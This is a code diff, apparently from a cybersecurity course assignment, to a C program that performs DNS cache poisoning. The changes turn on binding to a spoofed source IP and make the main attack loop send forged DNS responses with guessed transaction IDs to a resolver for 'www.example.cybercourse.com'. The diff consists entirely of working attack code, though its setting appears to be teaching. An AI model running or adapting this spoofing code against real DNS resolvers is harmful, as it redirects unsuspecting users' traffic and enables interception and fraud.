@@ -204,7 +204,7 @@ int build_dns_response(unsigned char *buffer, unsigned char *query, int query_le
 // Function to send the spoofed DNS response
 void send_spoofed_dns_response(const char *hostname, uint32_t txid, const char *destination_ip, int destination_port, uint32_t qtxid) {
     int sockfd;
-    struct sockaddr_in server_addr;
+    struct sockaddr_in server_addr, source_addr;
     unsigned char buffer[BUFFER_SIZE];
 
     // Step 1: Create a UDP socket
@@ -215,16 +215,16 @@ void send_spoofed_dns_response(const char *hostname, uint32_t txid, const char *
     }
 
 
-    //     // Step 2: Bind the socket to the spoofed source IP
-    // memset(&source_addr, 0, sizeof(source_addr));
-    // source_addr.sin_family = AF_INET;
-    // source_addr.sin_port = htons(0); // Bind to any available port
-    // inet_pton(AF_INET, SPOOFED_SOURCE_IP, &source_addr.sin_addr);
-    // if (bind(sockfd, (struct sockaddr *)&source_addr, sizeof(source_addr)) < 0) {
-    //     perror("Binding failed");
-    //     close(sockfd);
-    //     exit(EXIT_FAILURE);
-    // }
+        // Step 2: Bind the socket to the spoofed source IP
+    memset(&source_addr, 0, sizeof(source_addr));
+    source_addr.sin_family = AF_INET;
+    source_addr.sin_port = htons(0); // Bind to any available port
+    inet_pton(AF_INET, SPOOFED_SOURCE_IP, &source_addr.sin_addr);
+    if (bind(sockfd, (struct sockaddr *)&source_addr, sizeof(source_addr)) < 0) {
+        perror("Binding failed");
+        close(sockfd);
+        exit(EXIT_FAILURE);
+    }
 
 
     // Step 2: Configure the server address for sending the spoofed response
@@ -365,9 +365,9 @@ void run_attack(uint32_t *txid_ls) {
     printf("source port : %u\n", source_port);
     fill_txids(txid_ls, txid);
     for (int i = 0; i < 10; i++) {
-        // send_spoofed_dns_response("www.example.cybercourse.com", txid_ls[i], DNS_SERVER_IP, source_port, txid_ls[i]);
+        send_spoofed_dns_response("www.example.cybercourse.com", txid_ls[i], DNS_SERVER_IP, source_port, txid_ls[i]);
         // full_spoofed_answer(txid_ls[i], source_port);
-        send_spoofed_packet(RESOLVER_IP, source_port, DNS_QUERY_NAME, txid_ls[i]);
+        // send_spoofed_packet(RESOLVER_IP, source_port, DNS_QUERY_NAME, txid_ls[i]);
     }
     
     // Close the connection
